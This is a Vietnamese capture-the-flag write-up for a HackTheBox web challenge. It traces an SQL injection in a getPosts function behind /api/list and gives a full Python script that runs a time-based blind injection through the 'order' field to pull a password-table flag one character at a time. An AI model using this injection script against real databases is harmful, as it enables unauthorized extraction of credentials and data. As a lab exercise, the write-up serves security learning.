![alt text](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_swift_jobs/Untitled4.png)

mã nguồn được cho sẵn, ở hàm __getPosts__ trong tệp __database.js__ bị lỗi __sqli__
![alt text](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_swift_jobs/Untitled.png)

trong đường dẫn __/api/list có dùng hàm getPosts__ này
![alt text](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_swift_jobs/Untitled1.png)

flag được để trong __tables users__ ở dòng mà username là __flagholder__
![alt text](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_swift_jobs/Untitled3.png)

ta viết code để khai khác lấy flag

___url = 'http://188.166.173.208:30042/api/list'

import requests, string, time
arr = "_}"+ string.digits+ string.ascii_letters  + string.punctuation
s = requests.session()
def bind(step):
    for char in arr:
        a = time.time()
        s.post(url,data={'order':f"(select case when (select ascii(mid((select password from users  where username='flagholder'),{step},1))) LIKE {ord(char)} then sleep(0.6) else 1 end)"})
        b = time.time()
        if b-a > 4:
            return char
    return None        

def flag():
    flag = 'HTB{'
    step = len(flag) + 1 
    while True:
        c = bind(step)
        if c==None or c=='}':
            return flag + c
            
        flag += c 
        step += 1
        print('[+] flag = ',flag)

print('[+] flag = ',flag())__
